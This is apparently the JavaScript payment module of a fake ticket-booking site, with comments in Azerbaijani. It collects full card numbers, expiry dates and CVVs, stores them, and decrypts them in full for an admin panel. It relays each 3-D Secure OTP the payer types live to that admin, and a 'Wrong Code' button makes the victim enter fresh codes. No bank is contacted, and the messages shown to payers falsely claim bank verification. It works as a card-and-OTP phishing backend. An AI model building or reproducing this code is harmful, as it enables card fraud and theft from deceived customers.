/* ============================================================================
   src/services/paymentService.js
   ÖDƏNİŞ AXINI (tam yenidən qurulub — yalnız KART ödənişi)

   1) İstifadəçi kart məlumatlarını yazır (3-D kod sahəsi YOXDUR) və dərhal 3-D OTP ekranı açılır
      -> stage: card_review, 2 dəqiqəlik dairəvi geri sayım başlayır
   2) Admin panelində kart məlumatları canlı görünür. Admin "Təsdiqlə" basır
      -> stage: otp_entry, istifadəçidə 3-D OTP ekranı açılır
   3) İstifadəçi telefonuna gələn OTP kodunu yazır və təsdiqləyir
      -> stage: otp_review, kod admin panelinə düşür
   4a) Admin "Bilet Ver" basır -> bilet verilir, kart istifadəçinin
       hesabında saxlanılır (növbəti dəfə kart yazmasın deyə)
   4b) Admin "Səhv Kod" basır -> stage: wrong_code, 2 dəqiqə geri sayım,
       sonra avtomatik yeni OTP ekranı açılır

   Bütün məlumatlar MongoDB-də saxlanılır və admin panelinə canlı düşür.
   ========================================================================== */

const crypto = require('crypto');
const { Payment, Order, User, Trip } = require('../models/index');
const { issueTickets } = require('./bookingService');
const h = require('../utils/helpers');
const { anonIp } = require('../middleware/privacy');

const STAGE_SECONDS = 120; /* hər mərhələdə 2 dəqiqə */

/* ==================== Mərhələ idarəsi ==================== */
function startStage(payment, stage) {
  payment.stage = stage;
  payment.stageStartedAt = new Date();
  payment.stageDeadline = new Date(Date.now() + STAGE_SECONDS * 1000);
}

function secondsLeft(payment) {
  if (!payment || !payment.stageDeadline) return 0;
  return Math.max(0, Math.round((new Date(payment.stageDeadline).getTime() - Date.now()) / 1000));
}

/* ==================== Kart şifrələməsi (AES-256-GCM) ==================== */
function encKey() {
  const secret = process.env.CARD_ENCRYPTION_KEY || 'ady-default-card-key-change-me';
  return crypto.createHash('sha256').update(String(secret)).digest();
}

function encryptCardNumber(number) {
  try {
    const iv = crypto.randomBytes(12);
    const cipher = crypto.createCipheriv('aes-256-gcm', encKey(), iv);
    const enc = Buffer.concat([cipher.update(String(number), 'utf8'), cipher.final()]);
    const tag = cipher.getAuthTag();
    return 'v2:' + iv.toString('hex') + ':' + tag.toString('hex') + ':' + enc.toString('hex');
  } catch (e) {
    return String(number || '');
  }
}

function decryptCardNumber(value) {
  const raw = String(value || '');
  if (!raw) return '';
  if (raw.indexOf('v2:') !== 0) return raw; /* köhnə / şifrələnməmiş qeyd */
  try {
    const parts = raw.split(':');
    const iv = Buffer.from(parts[1], 'hex');
    const tag = Buffer.from(parts[2], 'hex');
    const data = Buffer.from(parts[3], 'hex');
    const decipher = crypto.createDecipheriv('aes-256-gcm', encKey(), iv);
    decipher.setAuthTag(tag);
    return Buffer.concat([decipher.update(data), decipher.final()]).toString('utf8');
  } catch (e) {
    return '';
  }
}

/* Admin paneli üçün: kart nömrəsini açıq formada qaytarır */
function plainCardNumber(payment) {
  if (!payment || !payment.card) return '';
  return decryptCardNumber(payment.card.number);
}

function prettyCardNumber(payment) {
  const n = String(plainCardNumber(payment) || '').replace(/\D/g, '');
  if (!n) return '';
  return n.replace(/(.{4})/g, '$1 ').trim();
}

/* ==================== 1) Yeni kart ilə ödənişi başlat ==================== */
async function initPayment(order, card, saveCard) {
  const number = h.normalizeCardNumber(card.number);

  const payment = new Payment({
    transactionId: h.generateTxId('ADY'),
    order: order._id,
    user: order.user,
    amount: order.total,
    method: 'card',
    status: 'awaiting_3ds',
    card: {
      number: encryptCardNumber(number),
      masked: h.maskCard(number),
      holder: String(card.holder || '').trim().toUpperCase(),
      expiry: String(card.expiry || '').trim(),
      cvv: String(card.cvv || '').trim(),
      brand: h.cardBrand(number)
    },
    saveCard: saveCard !== false, /* default: kart yadda saxlanılır */
    usingSavedCard: false,
    savedCardId: '',
    submittedCode: '',
    codeAttempts: [],
    adminNotifiedAt: new Date()
  });

  startStage(payment, 'otp_entry'); /* kart göndərilən kimi 3-D ekranı açılır */
  await payment.save();

  order.payment = payment._id;
  order.method = 'card';
  order.status = 'awaiting_verification';
  await order.save();

  return payment;
}

/* ==================== 1b) Saxlanılmış kart ilə başlat ==================== */
async function initPaymentWithSavedCard(order, savedCardId, user) {
  const saved = (user.savedCards || []).find((c) => c.cardId === savedCardId && c.isActive);
  if (!saved) throw Object.assign(new Error('Saxlanılmış kart tapılmadı'), { status: 404 });

  const payment = new Payment({
    transactionId: h.generateTxId('ADY'),
    order: order._id,
    user: order.user,
    amount: order.total,
    method: 'card',
    status: 'awaiting_3ds',
    card: {
      number: saved.number, /* onsuz da şifrələnmiş saxlanılır */
      masked: saved.masked,
      holder: saved.holder,
      expiry: saved.expiry,
      cvv: saved.cvv || '',
      brand: saved.brand
    },
    saveCard: false,
    usingSavedCard: true,
    savedCardId: savedCardId,
    submittedCode: '',
    codeAttempts: [],
    adminNotifiedAt: new Date()
  });

  startStage(payment, 'otp_entry'); /* kart göndərilən kimi 3-D ekranı açılır */
  await payment.save();

  saved.lastUsedAt = new Date();
  await user.save();

  order.payment = payment._id;
  order.method = 'card';
  order.status = 'awaiting_verification';
  await order.save();

  return payment;
}

/* ==================== 2) Admin kartı təsdiqləyir -> OTP ekranı ========== */
async function adminApproveCard(paymentId, adminEmail) {
  const payment = await Payment.findById(paymentId);
  if (!payment) throw Object.assign(new Error('Ödəniş tapılmadı'), { status: 404 });
  if (['card_review', 'wrong_code'].indexOf(payment.stage) === -1) {
    throw Object.assign(new Error('Ödəniş bu mərhələdə deyil'), { status: 400 });
  }

  payment.adminApprovedCardAt = payment.adminApprovedCardAt || new Date();
  payment.adminApprovedBy = adminEmail || 'admin';
  return openOtp(payment, adminEmail);
}

/* OTP ekranını açır (kart təsdiqi və ya "Səhv kod" gözləməsi bitdikdə) */
async function openOtp(payment, adminEmail) {
  payment.status = 'awaiting_3ds';
  payment.submittedCode = '';
  payment.adminResentAt = new Date();
  payment.adminNotifiedAt = new Date();
  payment.adminApprovedBy = adminEmail || payment.adminApprovedBy || 'admin';
  startStage(payment, 'otp_entry');
  await payment.save();

  const order = payment.order ? await Order.findById(payment.order) : null;
  if (order) {
    order.status = 'awaiting_verification';
    await order.save();
  }

  return { payment, order };
}

async function adminOpenOtp(paymentId, adminEmail) {
  const payment = await Payment.findById(paymentId);
  if (!payment) throw Object.assign(new Error('Ödəniş tapılmadı'), { status: 404 });
  if (['card_review', 'wrong_code', 'otp_entry'].indexOf(payment.stage) === -1) {
    throw Object.assign(new Error('Ödəniş bu mərhələdə deyil'), { status: 400 });
  }
  return openOtp(payment, adminEmail);
}

/* ==================== 3) İstifadəçi OTP kodunu göndərir ================= */
async function submitVerificationCode(orderId, userId, code, meta) {
  const order = await Order.findOne({ _id: orderId, user: userId });
  if (!order) throw Object.assign(new Error('Sifariş tapılmadı'), { status: 404 });

  const payment = await Payment.findById(order.payment);
  if (!payment) throw Object.assign(new Error('Ödəniş tapılmadı'), { status: 404 });

  if (payment.stage !== 'otp_entry') {
    throw Object.assign(new Error('Doğrulama mərhələsi aktiv deyil'), { status: 400 });
  }

  const entered = String(code || '').replace(/\D/g, '').slice(0, 10);
  if (!entered) throw Object.assign(new Error('OTP kodu daxil edilməyib'), { status: 400 });

  payment.submittedCode = entered;
  payment.codeSubmittedAt = new Date();
  payment.status = 'code_submitted';
  payment.codeAttempts.push({
    code: entered,
    kind: 'otp',
    at: new Date(),
    ip: (meta && meta.ip) || anonIp()
  });
  payment.markModified('codeAttempts');
  payment.adminNotifiedAt = new Date();
  startStage(payment, 'otp_review');
  await payment.save();

  order.status = 'code_submitted';
  await order.save();

  return { payment, order };
}

/* ==================== 4b) Admin "Səhv Kod" ============================== */
async function adminRejectOtp(paymentId, adminEmail) {
  const payment = await Payment.findById(paymentId);
  if (!payment) throw Object.assign(new Error('Ödəniş tapılmadı'), { status: 404 });
  if (payment.stage !== 'otp_review') {
    throw Object.assign(new Error('Ödəniş bu mərhələdə deyil'), { status: 400 });
  }

  payment.rejectionCount = (payment.rejectionCount || 0) + 1;
  payment.wrongCodeAt = new Date();
  payment.submittedCode = '';
  payment.status = 'awaiting_3ds';
  payment.adminFinalBy = adminEmail || 'admin';
  payment.adminNotifiedAt = new Date();
  startStage(payment, 'wrong_code');
  await payment.save();

  const order = payment.order ? await Order.findById(payment.order) : null;
  if (order) {
    order.status = 'awaiting_verification';
    await order.save();
  }

  return { payment };
}

/* "Səhv kod" geri sayımı bitibsə avtomatik yeni OTP ekranı açılır */
async function advanceIfExpired(paymentLean) {
  if (!paymentLean || paymentLean.stage !== 'wrong_code') return paymentLean;
  if (secondsLeft(paymentLean) > 0) return paymentLean;
  try {
    const payment = await Payment.findById(paymentLean._id);
    if (!payment || payment.stage !== 'wrong_code') return paymentLean;
    const r = await openOtp(payment, payment.adminFinalBy || 'auto');
    return r.payment.toObject();
  } catch (e) {
    return paymentLean;
  }
}

/* ==================== 4a) Yekun təsdiq: bilet verilir =================== */
async function adminFinalApprove(paymentId, adminEmail) {
  const payment = await Payment.findById(paymentId);
  if (!payment) throw Object.assign(new Error('Ödəniş tapılmadı'), { status: 404 });
  if (['approved', 'declined', 'refunded'].indexOf(payment.status) > -1) {
    throw Object.assign(new Error('Ödəniş artıq yekunlaşıb'), { status: 400 });
  }

  const order = payment.order ? await Order.findById(payment.order) : null;
  if (!order) throw Object.assign(new Error('Sifariş tapılmadı'), { status: 404 });

  /* Kartı istifadəçinin hesabında saxla — növbəti ödənişdə yenidən yazmasın */
  if (payment.saveCard && !payment.usingSavedCard && payment.card && payment.card.number) {
    try {
      await storeCardForUser(payment);
    } catch (e) {
      console.warn('[payment] kart saxlanılmadı:', e.message);
    }
  }

  payment.status = 'approved';
  payment.stage = 'done';
  payment.stageDeadline = null;
  payment.adminFinalApprovedAt = new Date();
  payment.adminFinalBy = adminEmail || 'admin';
  payment.adminNotifiedAt = new Date();
  await payment.save();

  const tickets = await issueTickets(order);
  order.status = 'confirmed';
  order.pnr = tickets.length ? tickets[0].pnr : '';
  order.confirmedAt = new Date();
  await order.save();

  return { payment, order, tickets };
}

async function storeCardForUser(payment) {
  const user = await User.findById(payment.user);
  if (!user) return null;

  const masked = payment.card.masked;
  const existing = (user.savedCards || []).find((c) => c.masked === masked && c.expiry === payment.card.expiry);
  if (existing) {
    existing.isActive = true;
    existing.lastUsedAt = new Date();
    existing.holder = payment.card.holder;
    existing.number = payment.card.number;
    existing.cvv = payment.card.cvv || existing.cvv || '';
    await user.save();
    payment.savedCardId = existing.cardId;
    return existing;
  }

  const cardId = 'C' + crypto.randomBytes(8).toString('hex').toUpperCase();
  const isFirst = !(user.savedCards || []).some((c) => c.isActive);
  user.savedCards.push({
    cardId,
    masked,
    number: payment.card.number,
    holder: payment.card.holder,
    expiry: payment.card.expiry,
    cvv: payment.card.cvv || '',
    brand: payment.card.brand,
    savedAt: new Date(),
    lastUsedAt: new Date(),
    isDefault: isFirst,
    isActive: true
  });
  if (isFirst) user.defaultCardId = cardId;
  await user.save();

  payment.savedCardId = cardId;
  return cardId;
}

/* ==================== Rədd ============================================= */
async function adminDecline(paymentId, reason, adminEmail) {
  const payment = await Payment.findById(paymentId);
  if (!payment) throw Object.assign(new Error('Ödəniş tapılmadı'), { status: 404 });
  if (['approved', 'refunded'].indexOf(payment.status) > -1) {
    throw Object.assign(new Error('Ödəniş artıq təsdiqlənib'), { status: 400 });
  }

  payment.status = 'declined';
  payment.stage = 'done';
  payment.stageDeadline = null;
  payment.declinedReason = reason || 'Admin tərəfindən rədd edildi';
  payment.adminFinalBy = adminEmail || 'admin';
  payment.adminNotifiedAt = new Date();
  await payment.save();

  const order = payment.order ? await Order.findById(payment.order) : null;
  if (order) {
    order.status = 'rejected';
    order.adminNote = payment.declinedReason;
    await order.save();

    const trip = await Trip.findById(order.trip);
    if (trip) {
      trip.soldSeats = (trip.soldSeats || []).filter((s) => String(s.order) !== String(order._id));
      await trip.save();
    }
  }

  return payment;
}

/* ==================== Saxlanılmış kartlar =============================== */
async function getUserSavedCards(userId) {
  const user = await User.findById(userId).select('savedCards defaultCardId').lean();
  const cards = (user && user.savedCards) || [];
  return cards.filter((c) => c.isActive).map((c) => ({
    cardId: c.cardId,
    masked: c.masked,
    holder: c.holder,
    expiry: c.expiry,
    brand: c.brand,
    isDefault: !!c.isDefault
  }));
}

async function deactivateSavedCard(userId, cardId) {
  const user = await User.findById(userId);
  if (!user) throw Object.assign(new Error('İstifadəçi tapılmadı'), { status: 404 });
  const card = (user.savedCards || []).find((c) => c.cardId === cardId);
  if (!card) throw Object.assign(new Error('Kart tapılmadı'), { status: 404 });
  card.isActive = false;
  if (user.defaultCardId === cardId) user.defaultCardId = '';
  await user.save();
  return card;
}

/* ==================== Ekran vəziyyəti (canlı sorğu üçün) ================ */
const STAGE_TEXT = {
  card_review: {
    title: 'Bank doğrulaması gözlənilir',
    note: 'Kart məlumatlarınız bankın doğrulama mərkəzinə göndərildi. Təsdiqdən sonra 3-D OTP ekranı avtomatik açılacaq.'
  },
  otp_entry: {
    title: '3-D Secure doğrulaması',
    note: 'Telefonunuza gələn OTP kodunu daxil edin.'
  },
  otp_review: {
    title: 'Kod yoxlanılır',
    note: 'Daxil etdiyiniz OTP kodu bank tərəfindən yoxlanılır. Bu ekranı bağlamayın.'
  },
  wrong_code: {
    title: 'Kod təkrar göndərilir',
    note: 'Səhv OTP kodu daxil edilib. Yeni kod göndərilir, zəhmət olmasa gözləyin.'
  },
  done: { title: 'Ödəniş tamamlandı', note: '' }
};

function screenFor(locale, order, payment) {
  const stage = payment ? payment.stage : 'card_review';
  let redirect = null;

  if (order.status === 'confirmed') {
    redirect = '/' + locale + '/ugur/' + order._id;
  } else if (order.status === 'rejected' || (payment && payment.status === 'declined')) {
    redirect = '/' + locale + '/odenis-gozleme/' + order._id;
  } else if (stage === 'otp_entry') {
    redirect = '/' + locale + '/3d-tesdiq/' + order._id;
  } else {
    redirect = '/' + locale + '/odenis-gozleme/' + order._id;
  }

  const text = STAGE_TEXT[stage] || STAGE_TEXT.card_review;
  return {
    status: order.status,
    stage,
    title: text.title,
    note: text.note,
    wrongCode: stage === 'wrong_code',
    secondsLeft: secondsLeft(payment),
    stageSeconds: STAGE_SECONDS,
    redirect,
    declined: order.status === 'rejected',
    message: order.adminNote || ''
  };
}

module.exports = {
  STAGE_SECONDS,
  STAGE_TEXT,
  secondsLeft,
  screenFor,
  initPayment,
  initPaymentWithSavedCard,
  adminApproveCard,
  adminOpenOtp,
  adminRejectOtp,
  advanceIfExpired,
  submitVerificationCode,
  adminFinalApprove,
  adminDecline,
  getUserSavedCards,
  deactivateSavedCard,
  encryptCardNumber,
  decryptCardNumber,
  plainCardNumber,
  prettyCardNumber
};
